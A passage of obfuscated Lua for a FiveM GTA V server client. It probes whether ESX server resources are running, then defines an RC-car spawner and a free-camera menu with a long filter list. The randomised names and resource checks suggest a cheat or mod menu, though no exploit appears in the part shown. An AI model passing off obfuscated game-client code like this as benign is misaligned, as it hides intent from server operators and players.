    gzhXdn5rXT132aD["jsfour-blindfold"] = false
end
if GetResourceState("esx_communityservice") ~= "missing" and GetResourceState("esx_communityservice") == "started" then
    gzhXdn5rXT132aD["esx_communityservice"] = true
else
    gzhXdn5rXT132aD["esx_communityservice"] = false
end
if GetResourceState("gcphone") ~= "missing" and GetResourceState("gcphone") == "started" then
    gzhXdn5rXT132aD["gcphone"] = true
else
    gzhXdn5rXT132aD["gcphone"] = false
end
if GetResourceState("esx_license") ~= "missing" and GetResourceState("esx_license") == "started" then
    gzhXdn5rXT132aD["esx_license"] = true
else
    gzhXdn5rXT132aD["esx_license"] = false
end
if GetResourceState("esx_vehicleshop") ~= "missing" and GetResourceState("esx_vehicleshop") == "started" then
    gzhXdn5rXT132aD["esx_vehicleshop"] = true
else
    gzhXdn5rXT132aD["esx_vehicleshop"] = false
end
if GetResourceState("esx_kashacters") ~= "missing" and GetResourceState("esx_kashacters") == "started" then
    gzhXdn5rXT132aD["esx_kashacters"] = true
else
    gzhXdn5rXT132aD["esx_kashacters"] = false
end
if GetResourceState("esx_outlawalert") ~= "missing" and GetResourceState("esx_outlawalert") == "started" then
    gzhXdn5rXT132aD["esx_outlawalert"] = true
else
    gzhXdn5rXT132aD["esx_outlawalert"] = false
end
local function T50GZbtxYdzNhvVL(xVMmgFUErc3QBhZf2)
    if (xVMmgFUErc3QBhZf2) then
        return "~g~enabled"
    else
        return "~r~disabled"
    end
end
local gqe9DjALh7ATnUs7e = false
local rfuz = false
local PuW_4RokLQaa9JQ_ = false
local function A7fm3VkIXMl1PT0Gm(zyHgtC19Fp)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(zyHgtC19Fp)
    DrawNotification(false, false)
end
local function kR3tkcBRzWGoBkSE(OTcGL3h, hi, HdDqmkdb0pHCJ1xtL)
    AddTextEntry("FMMC_KEY_TIP1", OTcGL3h .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", hi, "", "", "", HdDqmkdb0pHCJ1xtL)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local Y4cYWR = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return Y4cYWR
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
Math = {}
Math.Round = function(RUX9S, AG7wKu7GJZ8ZhX)
    if AG7wKu7GJZ8ZhX then
        local oYq9he4kxTlyTI03My = 10 ^ AG7wKu7GJZ8ZhX
        return math.floor((RUX9S * oYq9he4kxTlyTI03My) + 0.5) / (oYq9he4kxTlyTI03My)
    else
        return math.floor(RUX9S + 0.5)
    end
end
local TTf = {}
TTf.CarmeraEnabled = true
TTf.Start = function()
    if DoesEntityExist(TTf.Entity) then
        return
    end
    TTf.Spawn()
    TTf.Tablet(true)
    while DoesEntityExist(TTf.Entity) and DoesEntityExist(TTf.Driver) do
        Citizen.Wait(5)
        local adtRJtn68YFAPc =
            GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(TTf.Entity), true)
        TTf.DrawInstructions(adtRJtn68YFAPc)
        TTf.HandleKeys(adtRJtn68YFAPc)
        if adtRJtn68YFAPc <= 9999.9 then
            if not NetworkHasControlOfEntity(TTf.Driver) then
                NetworkRequestControlOfEntity(TTf.Driver)
            elseif not NetworkHasControlOfEntity(TTf.Entity) then
                NetworkRequestControlOfEntity(TTf.Entity)
            end
        else
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 6, 2500)
        end
    end
end
TTf.HandleKeys = function(BfqKss77djsrpW)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(TTf.Camera) then
            TTf.ToggleCamera(false)
        else
            TTf.ToggleCamera(true)
        end
    end
    if BfqKss77djsrpW <= 1.5 then
        if IsControlJustPressed(0, 38) then
            TTf.Attach("pick")
        end
    end
    if BfqKss77djsrpW < 9999.9 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 9, 1)
        end
        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 6, 2500)
        end
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(TTf.Driver, TTf.Entity, 5, 1)
        end
    end
end
TTf.DrawInstructions = function(aL7DOdC5ky8Ff95k9G)
    local uecxo9EmAdQkFOy = {
        {["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~"},
        {["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~"},
        {["label"] = "Reverse", ["button"] = "~INPUT_CELLPHONE_DOWN~"},
        {["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~"}
    }
    local AhnP1cjFR_JYqA_TKhd = {["label"] = "Pick Up", ["button"] = "~INPUT_CONTEXT~"}
    local laJSHMaSvJ6H = {{["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~"}}
    if aL7DOdC5ky8Ff95k9G <= 9999.9 then
        for buttonIndex = 1, #uecxo9EmAdQkFOy do
            local HmgatKWN3atu = uecxo9EmAdQkFOy[buttonIndex]
            table.insert(laJSHMaSvJ6H, HmgatKWN3atu)
        end
        if aL7DOdC5ky8Ff95k9G <= 1.5 then
            table.insert(laJSHMaSvJ6H, AhnP1cjFR_JYqA_TKhd)
        end
    end
    Citizen.CreateThread(
        function()
            local tk8n5sNbmMWRj = RequestScaleformMovie("instructional_buttons")
            while not HasScaleformMovieLoaded(tk8n5sNbmMWRj) do
                Wait(0)
            end
            PushScaleformMovieFunction(tk8n5sNbmMWRj, "CLEAR_ALL")
            PushScaleformMovieFunction(tk8n5sNbmMWRj, "TOGGLE_MOUSE_BUTTONS")
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()
            for qNJ1e, U6KtptFAyx in ipairs(laJSHMaSvJ6H) do
                PushScaleformMovieFunction(tk8n5sNbmMWRj, "SET_DATA_SLOT")
                PushScaleformMovieFunctionParameterInt(qNJ1e - 1)
                PushScaleformMovieMethodParameterButtonName(U6KtptFAyx["button"])
                PushScaleformMovieFunctionParameterString(U6KtptFAyx["label"])
                PopScaleformMovieFunctionVoid()
            end
            PushScaleformMovieFunction(tk8n5sNbmMWRj, "DRAW_INSTRUCTIONAL_BUTTONS")
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(tk8n5sNbmMWRj, 255, 255, 255, 255)
        end
    )
end
TTf.Spawn = function()
    TTf.LoadModels({GetHashKey("rcbandito"), 68070371})
    local Jz21c, VZgROWd3_ =
        GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
        GetEntityHeading(PlayerPedId())
    TTf.Entity = CreateVehicle(GetHashKey("rcbandito"), Jz21c, VZgROWd3_, true)
    while not DoesEntityExist(TTf.Entity) do
        Citizen.Wait(5)
    end
    TTf.Driver = CreatePed(5, 68070371, Jz21c, VZgROWd3_, true)
    SetEntityInvincible(TTf.Driver, true)
    SetEntityVisible(TTf.Driver, false)
    FreezeEntityPosition(TTf.Driver, true)
    SetPedAlertness(TTf.Driver, 0.0)
    TaskWarpPedIntoVehicle(TTf.Driver, TTf.Entity, -1)
    while not IsPedInVehicle(TTf.Driver, TTf.Entity) do
        Citizen.Wait(0)
    end
    TTf.Attach("place")
end
TTf.Attach = function(cffh5lGAojcAN19)
    if not DoesEntityExist(TTf.Entity) then
        return
    end
    TTf.LoadModels({"pickup_object"})
    if cffh5lGAojcAN19 == "place" then
        AttachEntityToEntity(
            TTf.Entity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            -0.1,
            0.0,
            -0.2,
            70.0,
            0.0,
            270.0,
            1,
            1,
            0,
            0,
            2,
            1
        )
        TaskPlayAnim(PlayerPedId(), "pickup_object", "pickup_low", 8.0, -8.0, -1, 0, 0, false, false, false)
        Citizen.Wait(800)
        DetachEntity(TTf.Entity, false, true)
        PlaceObjectOnGroundProperly(TTf.Entity)
    elseif cffh5lGAojcAN19 == "pick" then
        if DoesCamExist(TTf.Camera) then
            TTf.ToggleCamera(false)
        end
        TTf.Tablet(false)
        Citizen.Wait(100)
        TaskPlayAnim(PlayerPedId(), "pickup_object", "pickup_low", 8.0, -8.0, -1, 0, 0, false, false, false)
        Citizen.Wait(600)
        AttachEntityToEntity(
            TTf.Entity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            -0.1,
            0.0,
            -0.2,
            70.0,
            0.0,
            270.0,
            1,
            1,
            0,
            0,
            2,
            1
        )
        Citizen.Wait(900)
        DetachEntity(TTf.Entity)
        DeleteVehicle(TTf.Entity)
        DeleteEntity(TTf.Driver)
        TTf.UnloadModels()
    end
end
TTf.Tablet = function(guwNafZ1J)
    if guwNafZ1J then
        TTf.LoadModels({GetHashKey("prop_cs_tablet")})
        TTf.TabletEntity = CreateObject(GetHashKey("prop_cs_tablet"), GetEntityCoords(PlayerPedId()), true)
        AttachEntityToEntity(
            TTf.TabletEntity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            -0.03,
            0.0,
            0.0,
            0.0,
            0.0,
            0.0,
            true,
            true,
            false,
            true,
            1,
            true
        )
        TTf.LoadModels({"amb@code_human_in_bus_passenger_idles@female@tablet@idle_a"})
        TaskPlayAnim(
            PlayerPedId(),
            "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a",
            "idle_a",
            3.0,
            -8,
            -1,
            63,
            0,
            0,
            0,
            0
        )
        Citizen.CreateThread(
            function()
                while DoesEntityExist(TTf.TabletEntity) do
                    Citizen.Wait(5)
                    if
                        not IsEntityPlayingAnim(
                            PlayerPedId(),
                            "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a",
                            "idle_a",
                            3
                        )
                     then
                        TaskPlayAnim(
                            PlayerPedId(),
                            "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a",
                            "idle_a",
                            3.0,
                            -8,
                            -1,
                            63,
                            0,
                            0,
                            0,
                            0
                        )
                    end
                end
                ClearPedTasks(PlayerPedId())
            end
        )
    else
        DeleteEntity(TTf.TabletEntity)
    end
end
TTf.ToggleCamera = function(r5qWxvMDtk)
    if not TTf.CarmeraEnabled then
        return
    end
    if r5qWxvMDtk then
        if not DoesEntityExist(TTf.Entity) then
            return
        end
        if DoesCamExist(TTf.Camera) then
            DestroyCam(TTf.Camera)
        end
        TTf.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        AttachCamToEntity(TTf.Camera, TTf.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(TTf.Camera) do
                    Citizen.Wait(5)
                    SetCamRot(TTf.Camera, GetEntityRotation(TTf.Entity))
                end
            end
        )
        local m6kVLpodJup6 =
            500 *
            math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(TTf.Entity), true) / 10)
        RenderScriptCams(1, 1, m6kVLpodJup6, 1, 1)
        Citizen.Wait(m6kVLpodJup6)
        SetTimecycleModifier("scanline_cam_cheap")
        SetTimecycleModifierStrength(2.0)
    else
        local WbnuS7BZO =
            500 *
            math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(TTf.Entity), true) / 10)
        RenderScriptCams(0, 1, WbnuS7BZO, 1, 0)
        Citizen.Wait(WbnuS7BZO)
        ClearTimecycleModifier()
        DestroyCam(TTf.Camera)
    end
end
TTf.LoadModels = function(BYvfz8mf6OpwOVwOObf)
    for modelIndex = 1, #BYvfz8mf6OpwOVwOObf do
        local ymmAKHupLofy = BYvfz8mf6OpwOVwOObf[modelIndex]
        if not TTf.CachedModels then
            TTf.CachedModels = {}
        end
        table.insert(TTf.CachedModels, ymmAKHupLofy)
        if IsModelValid(ymmAKHupLofy) then
            while not HasModelLoaded(ymmAKHupLofy) do
                RequestModel(ymmAKHupLofy)
                Citizen.Wait(10)
            end
        else
            while not HasAnimDictLoaded(ymmAKHupLofy) do
                RequestAnimDict(ymmAKHupLofy)
                Citizen.Wait(10)
            end
        end
    end
end
TTf.UnloadModels = function()
    for modelIndex = 1, #TTf.CachedModels do
        local uk64ZbghAUREu = TTf.CachedModels[modelIndex]
        if IsModelValid(uk64ZbghAUREu) then
            SetModelAsNoLongerNeeded(uk64ZbghAUREu)
        else
            RemoveAnimDict(uk64ZbghAUREu)
        end
    end
end
Citizen.CreateThread(
    function()
        Cfg = {}
        Cfg.useNativeUI = false
        Cfg.useNativeUIReloaded = true
        Cfg.useButton = true
        Cfg.usePermissions = false
        Cfg.detachOption = true
        Cfg.maxDistance = 5000.0
        Cfg.minSpeed = 0.1
        Cfg.maxSpeed = 10.0
        Cfg.minPrecision = 0.1
        Cfg.incrPrecision = 0.1
        Cfg.maxPrecision = 2.0
        Cfg.minFov = 1.0
        Cfg.maxFov = 130.0
        Cfg.strings = {
            menuTitle = "Free Camera",
            menuSubtitle = "Control the Free Camera",
            toggleCam = "Camera active",
            toggleCamDesc = "Toggle camera on/off",
            precision = "Camera Precision",
            precisionDesc = "Change camera precision movement",
            filter = "Filter",
            filterDesc = "Change camera Filter",
            filterInten = "Filter Intensity",
            filterIntenDesc = "Change camera Filter Intensity",
            delFilter = "Reset Filter",
            delFilterDesc = "Remove filter and reset values",
            freeFly = "Toggle Free Fly Mode",
            freeFlyDesc = "Switch to Free Fly or back to Drone Mode",
            charControl = "Toggle Character Control",
            charControlDesc = "Switch to Character or back to Camera Control",
            attachCam = "Attach camera to: ",
            attachCamDesc = "Attach the camera to an entity in front of it",
            pointEntity = "Point camera at entity",
            pointEntityDesc = "Toggle pointing at selected entity",
            ctrlHelpRoll = "Roll Left/Right",
            ctrlHelpMove = "Movement",
            ctrlHelpRotate = "Rotate"
        }
        Cfg.controls = {
            keyboard = {
                openMenu = 178,
                hold = 21,
                speedUp = 15,
                speedDown = 14,
                zoomOut = 14,
                zoomIn = 15,
                forwards = 32,
                backwards = 33,
                left = 34,
                right = 35,
                up = 22,
                down = 36,
                rollLeft = 44,
                rollRight = 38
            },
            controller = {
                openMenu = 244,
                holdSpeed = 80,
                holdFov = 21,
                up = 172,
                down = 173,
                rollLeft = 37,
                rollRight = 44
            }
        }
        Cfg.disabledControls = {
            30,
            31,
            21,
            36,
            22,
            44,
            38,
            71,
            72,
            59,
            60,
            85,
            86,
            15,
            14,
            37,
            80,
            228,
            229,
            172,
            173,
            37,
            44,
            178,
            244
        }
        Cfg.filterList = {
            "None",
            "AP1_01_B_IntRefRange",
            "AP1_01_C_NoFog",
            "AirRaceBoost01",
            "AirRaceBoost02",
            "AmbientPUSH",
            "ArenaEMP",
            "ArenaEMP_Blend",
            "ArenaWheelPurple01",
            "ArenaWheelPurple02",
            "Bank_HLWD",
            "Barry1_Stoned",
            "BarryFadeOut",
            "BeastIntro01",
            "BeastIntro02",
            "BeastLaunch01",
            "BeastLaunch02",
            "BikerFilter",
            "BikerForm01",
            "BikerFormFlash",
            "Bikers",
            "BikersSPLASH",
            "BlackOut",
            "BleepYellow01",
            "BleepYellow02",
            "Bloom",
            "BloomLight",
            "BloomMid",
            "BombCam01",
            "BombCamFlash",
            "Broken_camera_fuzz",
            "BulletTimeDark",
            "BulletTimeLight",
            "CAMERA_BW",
            "CAMERA_secuirity",
            "CAMERA_secuirity_FUZZ",
            "CH3_06_water",
            "CHOP",
            "CS1_railwayB_tunnel",
            "CS3_rail_tunnel",
            "CUSTOM_streetlight",
            "Carpark_MP_exit",
            "CopsSPLASH",
            "CrossLine01",
            "CrossLine02",
            "DONT_overide_sunpos",
            "DRUG_2_drive",
            "DRUG_gas_huffin",
            "DeadlineNeon01",
            "DefaultColorCode",
            "Dont_tazeme_bro",
            "DrivingFocusDark",
            "DrivingFocusLight",
            "Drone_FishEye_Lens",
            "Drug_deadman",
            "Drug_deadman_blend",
            "Drunk",
            "EXTRA_bouncelight",
            "EXT_FULLAmbientmult_art",
            "ExplosionJosh",
            "FIB_5",
            "FIB_6",
            "FIB_A",
            "FIB_B",
            "FIB_interview",
            "FIB_interview_optimise",
            "FORdoron_delete",
            "FRANKLIN",
            "Facebook_NEW",
            "FinaleBank",
            "FinaleBankMid",
            "FinaleBankexit",
            "Forest",
            "FrankilinsHOUSEhills",
            "FranklinColorCode",
            "FranklinColorCodeBasic",
            "FranklinColorCodeBright",
            "FullAmbientmult_interior",
            "Glasses_BlackOut",
            "Hanger_INTmods",
            "Hicksbar",
            "HicksbarNEW",
            "Hint_cam",
            "IMpExt_Interior_02",
            "IMpExt_Interior_02_stair_cage",
            "INT_FULLAmbientmult_art",
            "INT_FULLAmbientmult_both",
            "INT_FullAmbientmult",
            "INT_NO_fogALPHA",
            "INT_NOdirectLight",
            "INT_NoAmbientmult",
            "INT_NoAmbientmult_art",
            "INT_NoAmbientmult_both",
            "INT_garage",
            "INT_mall",
            "INT_nowaterREF",
            "INT_posh_hairdresser",
            "INT_smshop",
            "INT_smshop_inMOD",
            "INT_smshop_indoor_bloom",
            "INT_smshop_outdoor_bloom",
            "INT_streetlighting",
            "INT_trailer_cinema",
            "ImpExp_Interior_01",
            "InchOrange01",
            "InchOrange02",
            "InchPickup01",
            "InchPickup02",
            "InchPurple01",
            "InchPurple02",
            "KT_underpass",
            "Kifflom",
            "LIGHTSreduceFALLOFF",
            "LODmult_HD_orphan_LOD_reduce",
            "LODmult_HD_orphan_reduce",
            "LODmult_LOD_reduce",
            "LODmult_SLOD1_reduce",
            "LODmult_SLOD2_reduce",
            "LODmult_SLOD3_reduce",
            "LODmult_global_reduce",
            "LODmult_global_reduce_NOHD",
            "LectroDark",
            "LectroLight",
            "LifeInvaderLOD",
            "LightPollutionHills",
            "LostTimeDark",
            "LostTimeFlash",
            "LostTimeLight",
            "METRO_Tunnels",
            "METRO_Tunnels_entrance",
            "METRO_platform",
            "MPApartHigh",
            "MPApartHigh_palnning",
            "MPApart_H_01",
            "MPApart_H_01_gym",
            "MP_Arena_VIP",
            "MP_Arena_theme_atlantis",
            "MP_Arena_theme_evening",
            "MP_Arena_theme_hell",
            "MP_Arena_theme_midday",
            "MP_Arena_theme_morning",
            "MP_Arena_theme_night",
            "MP_Arena_theme_saccharine",
            "MP_Arena_theme_sandstorm",
            "MP_Arena_theme_scifi_night",
            "MP_Arena_theme_storm",
            "MP_Arena_theme_toxic",
            "MP_Bull_tost",
            "MP_Bull_tost_blend",
            "MP_Garage_L",
            "MP_H_01_Bathroom",
            "MP_H_01_Bedroom",
            "MP_H_01_New",
            "MP_H_01_New_Bathroom",
            "MP_H_01_New_Bedroom",
            "MP_H_01_New_Study",
            "MP_H_01_Study",
            "MP_H_02",
            "MP_H_04",
            "MP_H_06",
            "MP_Killstreak",
            "MP_Killstreak_blend",
            "MP_Loser",
            "MP_Loser_blend",
            "MP_MedGarage",
            "MP_Powerplay",
            "MP_Powerplay_blend",
            "MP_Studio_Lo",
            "MP_corona_heist",
            "MP_corona_heist_BW",
            "MP_corona_heist_BW_night",
            "MP_corona_heist_DOF",
            "MP_corona_heist_blend",
            "MP_corona_heist_night",
            "MP_corona_heist_night_blend",
            "MP_corona_selection",
            "MP_corona_switch",
            "MP_corona_tournament",
            "MP_corona_tournament_DOF",
            "MP_death_grade",
            "MP_death_grade_blend01",
            "MP_death_grade_blend02",
            "MP_deathfail_night",
            "MP_heli_cam",
            "MP_intro_logo",
            "MP_job_end_night",
            "MP_job_load",
            "MP_job_load_01",
            "MP_job_load_02",
            "MP_job_lose",
            "MP_job_preload",
            "MP_job_preload_blend",
            "MP_job_preload_night",
            "MP_job_win",
            "MP_lowgarage",
            "MP_race_finish",
            "MP_select",
            "MichaelColorCode",
            "MichaelColorCodeBasic",
            "MichaelColorCodeBright",
            "MichaelsDarkroom",
            "MichaelsDirectional",
            "MichaelsNODirectional",
            "Mp_Stilts",
            "Mp_Stilts2",
            "Mp_Stilts2_bath",
            "Mp_Stilts_gym",
            "Mp_Stilts_gym2",
            "Mp_apart_mid",
            "Multipayer_spectatorCam",
            "NEW_abattoir",
            "NEW_jewel",
            "NEW_jewel_EXIT",
            "NEW_lesters",
            "NEW_ornate_bank",
            "NEW_ornate_bank_entrance",
            "NEW_ornate_bank_office",
            "NEW_ornate_bank_safe",
            "NEW_shrinksOffice",
            "NEW_station_unfinished",
            "NEW_trevorstrailer",
            "NEW_tunnels",
            "NEW_tunnels_ditch",
            "NEW_tunnels_hole",
            "NEW_yellowtunnels",
            "NG_blackout",
            "NG_deathfail_BW_base",
            "NG_deathfail_BW_blend01",
            "NG_deathfail_BW_blend02",
            "NG_filmic01",
            "NG_filmic02",
            "NG_filmic03",
            "NG_filmic04",
            "NG_filmic05",
            "NG_filmic06",
            "NG_filmic07",
            "NG_filmic08",
            "NG_filmic09",
            "NG_filmic10",
            "NG_filmic11",
            "NG_filmic12",
            "NG_filmic13",
            "NG_filmic14",
            "NG_filmic15",
            "NG_filmic16",
            "NG_filmic17",
            "NG_filmic18",
            "NG_filmic19",
            "NG_filmic20",
            "NG_filmic21",
            "NG_filmic22",
            "NG_filmic23",
            "NG_filmic24",
            "NG_filmic25",
            "NG_filmnoir_BW01",
            "NG_filmnoir_BW02",
            "NG_first",
            "NO_coronas",
            "NO_fog_alpha",
            "NO_streetAmbient",
            "NO_weather",
            "NOdirectLight",
            "NOrain",
            "NeutralColorCode",
            "NeutralColorCodeBasic",
            "NeutralColorCodeBright",
            "NeutralColorCodeLight",
            "NewMicheal",
            "NewMicheal_night",
            "NewMicheal_upstairs",
            "NewMichealgirly",
            "NewMichealstoilet",
            "NewMichealupstairs",
            "New_sewers",
            "NoAmbientmult",
            "NoAmbientmult_interior",
            "NoPedLight",
            "OrbitalCannon",
            "PERSHING_water_reflect",
            "PORT_heist_underwater",
            "PPFilter",
            "PPGreen01",
            "PPGreen02",
            "PPOrange01",
            "PPOrange02",
            "PPPink01",
            "PPPink02",
            "PPPurple01",
            "PPPurple02",
            "Paleto",
            "PennedInDark",
            "PennedInLight",
            "PlayerSwitchNeutralFlash",
            "PlayerSwitchPulse",
            "PoliceStation",
            "PoliceStationDark",
            "Prologue_shootout_opt",
            "REDMIST",
            "REDMIST_blend",
            "RaceTurboDark",
            "RaceTurboFlash",
            "RaceTurboLight",
            "ReduceDrawDistance",
            "ReduceDrawDistanceMAP",
            "ReduceDrawDistanceMission",
            "ReduceSSAO",
            "RemixDrone",
            "RemoteSniper",
            "SALTONSEA",
            "SAWMILL",
            "SP1_03_drawDistance",
            "STRIP_changing",
            "STRIP_nofog",
            "STRIP_office",
            "STRIP_stage",
            "SheriffStation",
            "Shop247",
            "Shop247_none",
            "SmugglerCheckpoint01",
            "SmugglerCheckpoint02",
            "SmugglerFlash",
            "Sniper",
            "StadLobby",
            "StreetLighting",
            "StreetLightingJunction",
            "StreetLightingtraffic",
            "StuntFastDark",
            "StuntFastLight",
            "StuntSlowDark",
            "StuntSlowLight",
            "TREVOR",
            "TUNNEL_green",
            "TUNNEL_green_ext",
            "TUNNEL_orange",
            "TUNNEL_orange_exterior",
            "TUNNEL_white",
            "TUNNEL_yellow",
            "TUNNEL_yellow_ext",
            "TinyGreen01",
            "TinyGreen02",
            "TinyPink01",
            "TinyPink02",
            "TinyRacerMoBlur",
            "TransformFlash",
            "TransformRaceFlash",
            "TrevorColorCode",
            "TrevorColorCodeBasic",
            "TrevorColorCodeBright",
            "Trevors_room",
            "Tunnel",
            "Tunnel_green1",
            "VAGOS_new_garage",
            "VAGOS_new_hangout",
            "VC_tunnel_entrance",
            "V_Abattoir_Cold",
            "V_CIA_Facility",
            "V_FIB_IT3",
            "V_FIB_IT3_alt",
            "V_FIB_IT3_alt5",
            "V_FIB_stairs",
            "V_Metro2",
            "V_Metro_station",
            "V_Office_smoke",
            "V_Office_smoke_Fire",
            "V_Office_smoke_ext",
            "V_Solomons",
            "V_recycle_dark",
            "V_recycle_light",
            "V_recycle_mainroom",
            "V_strip_nofog",
            "V_strip_office",
            "Vagos",
            "VagosSPLASH",
            "VolticBlur",
            "VolticFlash",
            "VolticGold",
            "WATER_lab_cooling",
            "WATER_CH2_06_01_03",
            "WATER_CH2_06_02",
            "WATER_CH2_06_04",
            "WATER_ID2_21",
            "WATER_REF_malibu",
            "WATER_RichmanStuntJump",
            "WATER_cove",
            "WATER_hills",
            "WATER_lab",
            "WATER_militaryPOOP",
            "WATER_muddy",
            "WATER_port",
            "WATER_refmap_high",
            "WATER_refmap_hollywoodlake",
            "WATER_refmap_low",
            "WATER_refmap_med",
            "WATER_refmap_off",
            "WATER_refmap_poolside",
            "WATER_refmap_silverlake",
            "WATER_refmap_venice",
            "WATER_refmap_verylow",
            "WATER_resevoir",
            "WATER_river",
            "WATER_salton",
            "WATER_salton_bottom",
            "WATER_shore",
            "WATER_silty",
            "WATER_silverlake",
            "WarpCheckpoint",
            "WeaponUpgrade",
            "WhiteOut",
            "baseTONEMAPPING",
            "blackNwhite",
            "buggy_shack",
            "buildingTOP",
            "cBank_back",
            "cBank_front",
            "canyon_mission",
            "carMOD_underpass",
            "carpark",
            "carpark_dt1_02",
            "carpark_dt1_03",
            "cashdepot",
            "cashdepotEMERGENCY",
            "ch2_tunnel_whitelight",
            "cinema",
            "cinema_001",
            "cops",
            "crane_cam",
            "crane_cam_cinematic",
            "damage",
            "default",
            "dont_tazeme_bro_b",
            "downtown_FIB_cascades_opt",
            "drug_drive_blend01",
            "drug_drive_blend02",
            "drug_flying_01",
            "drug_flying_02",
            "drug_flying_base",
            "drug_wobbly",
            "dying",
            "eatra_bouncelight_beach",
            "epsilion",
            "exile1_exit",
            "exile1_plane",
            "ext_int_extlight_large",
            "eyeINtheSKY",
            "facebook_serveroom",
            "fireDEPT",
            "fp_vig_black",
            "fp_vig_blue",
            "fp_vig_brown",
            "fp_vig_gray",
            "fp_vig_green",
            "fp_vig_red",
            "frankilnsAUNTS_SUNdir",
            "frankilnsAUNTS_new",
            "gallery_refmod",
            "garage",
            "gen_bank",
            "glasses_Darkblue",
            "glasses_Scuba",
            "glasses_VISOR",
            "glasses_black",
            "glasses_blue",
            "glasses_brown",
            "glasses_green",
            "glasses_orange",
            "glasses_pink",
            "glasses_purple",
            "glasses_red",
            "glasses_yellow",
            "gorge_reflection_gpu",
            "gorge_reflectionoffset",
            "gorge_reflectionoffset2",
            "graveyard_shootout",
            "grdlc_int_02",
            "grdlc_int_02_trailer_cave",
            "gunclub",
            "gunclubrange",
            "gunshop",
            "gunstore",
            "half_direct",
            "hangar_lightsmod",
            "heathaze",
            "heist_boat",
            "heist_boat_engineRoom",
            "heist_boat_norain",
            "heliGunCam",
            "helicamfirst",
            "hillstunnel",
            "hitped",
            "hud_def_Franklin",
            "hud_def_Michael",
            "hud_def_Trevor",
            "hud_def_blur",
            "hud_def_blur_switch",
            "hud_def_colorgrade",
            "hud_def_desat_Franklin",
            "hud_def_desat_Michael",
            "hud_def_desat_Neutral",
            "hud_def_desat_Trevor",
            "hud_def_desat_cold",
            "hud_def_desat_cold_kill",
            "hud_def_desat_switch",
            "hud_def_desatcrunch",
            "hud_def_flash",
            "hud_def_focus",
            "hud_def_lensdistortion",
            "hud_def_lensdistortion_subtle",
            "id1_11_tunnel",
            "impexp_interior_01_lift",
            "int_Barber1",
            "int_ClothesHi",
            "int_ControlTower_none",
            "int_ControlTower_small",
            "int_Farmhouse_none",
            "int_Farmhouse_small",
            "int_FranklinAunt_small",
            "int_GasStation",
            "int_Hospital2_DM",
            "int_Hospital_Blue",
            "int_Hospital_BlueB",
            "int_Hospital_DM",
            "int_Lost_none",
            "int_Lost_small",
            "int_amb_mult_large",
            "int_arena_01",
            "int_arena_Mod",
            "int_arena_Mod_garage",
            "int_arena_VIP",
            "int_carmod_small",
            "int_carrier_control",
            "int_carrier_control_2",
            "int_carrier_hanger",
            "int_carrier_rear",
            "int_carrier_stair",
            "int_carshowroom",
            "int_chopshop",
            "int_clean_extlight_large",
            "int_clean_extlight_none",
            "int_clean_extlight_small",
            "int_clotheslow_large",
            "int_cluckinfactory_none",
            "int_cluckinfactory_small",
            "int_dockcontrol_small",
            "int_extlght_sm_cntrst",
            "int_extlight_large",
            "int_extlight_large_fog",
            "int_extlight_none",
            "int_extlight_none_dark",
            "int_extlight_none_dark_fog",
            "int_extlight_none_fog",
            "int_extlight_small",
            "int_extlight_small_clipped",
            "int_extlight_small_fog",
            "int_hanger_none",
            "int_hanger_small",
            "int_hospital_dark",
            "int_hospital_small",
            "int_lesters",
            "int_methlab_small",
            "int_motelroom",
            "int_office_Lobby",
